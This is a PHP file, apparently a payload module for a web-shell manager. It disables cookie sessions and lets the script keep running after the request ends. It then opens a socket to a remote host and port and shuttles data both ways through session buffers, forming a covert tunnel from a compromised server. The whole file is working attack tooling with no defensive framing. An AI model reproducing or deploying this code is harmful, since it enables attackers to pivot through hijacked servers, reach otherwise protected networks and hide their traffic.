<?php
// global: $rhost, $rport, $conn_id, $schema
ini_set("session.use_trans_sid" ,0);
ini_set("session.use_only_cookies" ,0);
ini_set("session.use_cookies" ,0);
set_time_limit(0);
ignore_user_abort();

function run($vars){
    extract($vars);
    session_id($conn_id);
    $ret = array('code'=>1, 'msg'=>'');
    session_start();
    $_SESSION['run'] = true;
    $_SESSION['readbuf'] = '';
    $_SESSION['writebuf'] = '';
    session_write_close();
    register_shutdown_function(function(){
        unset($_SESSION);
        session_destroy();
    });
    
    $res = fsockopen("$schema://$rhost", $rport, $errno, $errstr, 10);
    if($res === false){
        $ret['msg'] = base64_encode("Connect error: No. {$errno}, {$errstr}");
        $ret['code'] = -1;
        return json_encode($ret);
    }
    stream_set_blocking($res, false);
    while($_SESSION['run']){
        $readbuf = '';
        while(!feof($res)){
            $tmp = fread($res, 1024);
            if($tmp == ''){
                break;
            }
            $readbuf .= $tmp;
        }
        if($readbuf != ''){
            session_start();
            $_SESSION['readbuf'] .= $readbuf;
            session_write_close();
        }
    
        session_start();
        $writebuf = $_SESSION['writebuf'];
        $_SESSION['writebuf'] = '';
        session_write_close();
        if($writebuf != ''){
            if(fwrite($res, $writebuf) === false){
                break;
            }
        }
        usleep(100000);
    }
    @fclose($res);
    return json_encode($ret);
}